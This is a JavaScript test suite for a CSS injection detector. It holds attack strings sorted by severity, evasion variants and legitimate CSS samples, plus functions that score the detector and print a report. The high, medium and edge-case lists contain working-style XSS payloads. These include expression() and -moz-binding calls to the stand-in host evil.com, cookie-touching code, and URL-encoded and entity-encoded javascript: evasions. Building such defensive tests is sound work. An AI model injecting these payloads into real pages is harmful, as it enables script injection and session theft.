/**
 * Security Test Suite for CSS Injection Protection
 * This utility provides comprehensive test cases for CSS injection detection
 */

const cssInjectionTestCases = {
  // High severity CSS injection attempts
  highSeverity: [
    // CSS expression attacks (IE specific)
    'background-color: expression(alert("XSS"));',
    'width: expression(document.cookie="stolen=true");',
    'color: expression(window.location="http://evil.com");',

    // CSS behavior attacks
    'behavior: url(xss.htc);',
    'behavior: url("javascript:alert(\'XSS\')");',
    '-ms-behavior: url(evil.htc);',

    // CSS binding attacks
    'binding: url(xss.xml#MyBehavior);',
    '-moz-binding: url("http://evil.com/xss.xml#hack");',
    '-moz-binding: url(data:text/xml;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=);',

    // JavaScript protocol in CSS
    'background-image: url("javascript:alert(\'CSS XSS\')");',
    'list-style-image: url(javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41)));',

    // VBScript in CSS
    'background: url(vbscript:msgbox("XSS"));',

    // Combined attacks
    '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
    'style="background: expression(alert(\'XSS\'))"'
  ],

  // Medium severity CSS injection attempts
  mediumSeverity: [
    // CSS import attacks
    '@import url("http://evil.com/malicious.css");',
    '@import "javascript:alert(\'CSS Import XSS\')";',
    '@import url(data:text/css;base64,Ym9keXtiYWNrZ3JvdW5kOnVybCgiamF2YXNjcmlwdDphbGVydCgnWFNTJykiKX0=);',

    // CSS font-face attacks
    '@font-face { font-family: "evil"; src: url("javascript:alert(\'Font XSS\')"); }',
    '@font-face { src: url(data:application/x-font-woff;base64,malicious_data_here); }',

    // CSS keyframes attacks
    '@keyframes hack { 0% { background-image: url("javascript:alert(\'Keyframe XSS\')"); } }',
    '@-webkit-keyframes evil { from { content: url("javascript:void(0)"); } }',

    // CSS filter attacks (IE specific)
    'filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src="javascript:alert(\'Filter XSS\')");',
    '-ms-filter: "progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr=javascript:alert(\'XSS\'))";',

    // CSS content injection
    'content: "<script>alert(\'Content XSS\')</script>";',
    'content: url("javascript:alert(\'Content URL XSS\')");',

    // CSS counter attacks
    'counter-reset: evil "<script>alert(\'Counter XSS\')</script>";',
    'counter-increment: hack "<iframe src=javascript:alert(\'XSS\')></iframe>";',

    // CSS pseudo-element attacks
    '::before { content: "<script>alert(\'Before XSS\')</script>"; }',
    '::after { content: url("javascript:alert(\'After XSS\')"); }'
  ],

  // Low severity CSS injection attempts
  lowSeverity: [
    // CSS animation attacks
    'animation: hack 1s infinite; @keyframes hack { to { opacity: 0; } }',
    '-webkit-animation: evil 2s ease-in-out;',

    // CSS transition attacks
    'transition: all 1s ease-in-out;',
    '-webkit-transition: opacity 0.5s;',

    // CSS transform attacks
    'transform: rotate(45deg);',
    '-webkit-transform: scale(1.5);',

    // CSS background with suspicious URLs
    'background: url("http://evil.com/track.gif");',
    'background-image: url("//evil.com/pixel.png");',

    // CSS media query injection
    '@media screen and (max-width: 768px) { body { display: none; } }',
    '@media print { * { display: none !important; } }',

    // CSS unicode escapes
    'content: "\\41 \\6C \\65 \\72 \\74"; /* "Alert" in unicode */',
    'font-family: "\\0041 rial"; /* "Arial" with unicode */',

    // CSS comments with suspicious content
    '/* <script>alert("XSS")</script> */ color: red;',
    '/* background: url("javascript:void(0)"); */ padding: 10px;'
  ],

  // Edge cases and complex attacks
  edgeCases: [
    // Nested style tags
    '<style><style>body{background:url("javascript:alert(\'Nested XSS\')")}</style></style>',

    // Mixed case evasion
    'BACKGROUND-IMAGE: URL("JAVASCRIPT:ALERT(\'CASE EVASION\')");',
    'ExPrEsSiOn(AlErT(\'MiXeD cAsE\'))',

    // URL encoding evasion
    'background: url("%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%27%58%53%53%27%29");',

    // HTML entity evasion
    'background: url("&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;");',

    // CSS function chaining
    'background: calc(1px) url("javascript:alert(\'Calc XSS\')");',
    'width: attr(data-width) expression(alert(\'Attr Expression\'));',

    // CDATA injection
    '<style><![CDATA[body{background:url("javascript:alert(\'CDATA XSS\')")}]]></style>',

    // Multiple protocol attempts
    'background: url("vbscript:msgbox(\'VBS\')"), url("javascript:alert(\'JS\')");',

    // CSS with HTML injection
    'content: "</style><script>alert(\'Breaking out of CSS\')</script><style>";',

    // Long payload to test buffer handling
    'background: ' + 'url("javascript:alert(\'XSS\')") '.repeat(100) + ';'
  ],

  // Legitimate CSS that should NOT be blocked
  legitimate: [
    'color: red;',
    'background-color: #ffffff;',
    'font-family: Arial, sans-serif;',
    'margin: 10px auto;',
    'border: 1px solid #ccc;',
    'background-image: url("https://example.com/image.jpg");',
    'background: linear-gradient(to bottom, #fff, #000);',
    'transform: translateX(50px);',
    'animation: fadeIn 0.5s ease-in-out;',
    'box-shadow: 0 2px 4px rgba(0,0,0,0.1);',
    '@media screen and (max-width: 768px) { .responsive { display: block; } }',
    '@font-face { font-family: "CustomFont"; src: url("fonts/custom.woff2"); }',
    'content: "Normal text content";',
    'counter-reset: section;',
    'list-style: disc outside;',
    '/* This is a normal CSS comment */',
    'background: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAiIGhlaWdodD0iMTAiPjxyZWN0IHdpZHRoPSIxMCIgaGVpZ2h0PSIxMCIgZmlsbD0iIzAwMCIvPjwvc3ZnPg==");'
  ]
};

/**
 * Run comprehensive CSS injection tests
 */
function runCSSInjectionTests(cssProtection) {
  const results = {
    timestamp: new Date(),
    summary: {
      totalTests: 0,
      passed: 0,
      failed: 0,
      falsePositives: 0,
      falseNegatives: 0
    },
    details: {
      highSeverity: [],
      mediumSeverity: [],
      lowSeverity: [],
      edgeCases: [],
      legitimate: []
    }
  };

  // Test high severity attacks
  cssInjectionTestCases.highSeverity.forEach((testCase, index) => {
    const detection = cssProtection.detectCSSInjection(testCase, `highSeverity[${index}]`);
    const testResult = {
      input: testCase.substring(0, 100), // Truncate for readability
      expected: 'detected_high',
      actual: detection.detected ? `detected_${detection.severity}` : 'not_detected',
      passed: detection.detected && detection.severity === 'high',
      patterns: detection.patterns.map(p => p.pattern)
    };

    results.details.highSeverity.push(testResult);
    results.summary.totalTests++;

    if (testResult.passed) {
      results.summary.passed++;
    } else {
      results.summary.failed++;
      if (!detection.detected) {
        results.summary.falseNegatives++;
      }
    }
  });

  // Test medium severity attacks
  cssInjectionTestCases.mediumSeverity.forEach((testCase, index) => {
    const detection = cssProtection.detectCSSInjection(testCase, `mediumSeverity[${index}]`);
    const testResult = {
      input: testCase.substring(0, 100),
      expected: 'detected_medium_or_high',
      actual: detection.detected ? `detected_${detection.severity}` : 'not_detected',
      passed: detection.detected && (detection.severity === 'medium' || detection.severity === 'high'),
      patterns: detection.patterns.map(p => p.pattern)
    };

    results.details.mediumSeverity.push(testResult);
    results.summary.totalTests++;

    if (testResult.passed) {
      results.summary.passed++;
    } else {
      results.summary.failed++;
      if (!detection.detected) {
        results.summary.falseNegatives++;
      }
    }
  });

  // Test low severity attacks
  cssInjectionTestCases.lowSeverity.forEach((testCase, index) => {
    const detection = cssProtection.detectCSSInjection(testCase, `lowSeverity[${index}]`);
    const testResult = {
      input: testCase.substring(0, 100),
      expected: 'detected_any_severity',
      actual: detection.detected ? `detected_${detection.severity}` : 'not_detected',
      passed: detection.detected,
      patterns: detection.patterns.map(p => p.pattern)
    };

    results.details.lowSeverity.push(testResult);
    results.summary.totalTests++;

    if (testResult.passed) {
      results.summary.passed++;
    } else {
      results.summary.failed++;
      if (!detection.detected) {
        results.summary.falseNegatives++;
      }
    }
  });

  // Test edge cases
  cssInjectionTestCases.edgeCases.forEach((testCase, index) => {
    const detection = cssProtection.detectCSSInjection(testCase, `edgeCase[${index}]`);
    const testResult = {
      input: testCase.substring(0, 100),
      expected: 'detected_any_severity',
      actual: detection.detected ? `detected_${detection.severity}` : 'not_detected',
      passed: detection.detected,
      patterns: detection.patterns.map(p => p.pattern)
    };

    results.details.edgeCases.push(testResult);
    results.summary.totalTests++;

    if (testResult.passed) {
      results.summary.passed++;
    } else {
      results.summary.failed++;
      if (!detection.detected) {
        results.summary.falseNegatives++;
      }
    }
  });

  // Test legitimate CSS (should NOT be detected)
  cssInjectionTestCases.legitimate.forEach((testCase, index) => {
    const detection = cssProtection.detectCSSInjection(testCase, `legitimate[${index}]`);
    const testResult = {
      input: testCase.substring(0, 100),
      expected: 'not_detected',
      actual: detection.detected ? `detected_${detection.severity}` : 'not_detected',
      passed: !detection.detected,
      patterns: detection.patterns.map(p => p.pattern)
    };

    results.details.legitimate.push(testResult);
    results.summary.totalTests++;

    if (testResult.passed) {
      results.summary.passed++;
    } else {
      results.summary.failed++;
      results.summary.falsePositives++;
    }
  });

  // Calculate success rate
  results.summary.successRate = results.summary.totalTests > 0 ?
    ((results.summary.passed / results.summary.totalTests) * 100).toFixed(2) : 0;

  return results;
}

/**
 * Generate security test report
 */
function generateSecurityReport(results) {
  let report = '\n=== CSS INJECTION PROTECTION TEST REPORT ===\n';
  report += `Test Date: ${results.timestamp.toISOString()}\n`;
  report += `Total Tests: ${results.summary.totalTests}\n`;
  report += `Passed: ${results.summary.passed}\n`;
  report += `Failed: ${results.summary.failed}\n`;
  report += `Success Rate: ${results.summary.successRate}%\n`;
  report += `False Positives: ${results.summary.falsePositives}\n`;
  report += `False Negatives: ${results.summary.falseNegatives}\n\n`;

  // Add failed test details
  if (results.summary.failed > 0) {
    report += '=== FAILED TESTS ===\n';

    Object.keys(results.details).forEach(category => {
      const failedTests = results.details[category].filter(test => !test.passed);
      if (failedTests.length > 0) {
        report += `\n${category.toUpperCase()} Failures:\n`;
        failedTests.forEach((test, index) => {
          report += `${index + 1}. Input: ${test.input}\n`;
          report += `   Expected: ${test.expected}\n`;
          report += `   Actual: ${test.actual}\n`;
          report += `   Patterns: ${test.patterns.join(', ') || 'none'}\n\n`;
        });
      }
    });
  }

  return report;
}

module.exports = {
  cssInjectionTestCases,
  runCSSInjectionTests,
  generateSecurityReport
};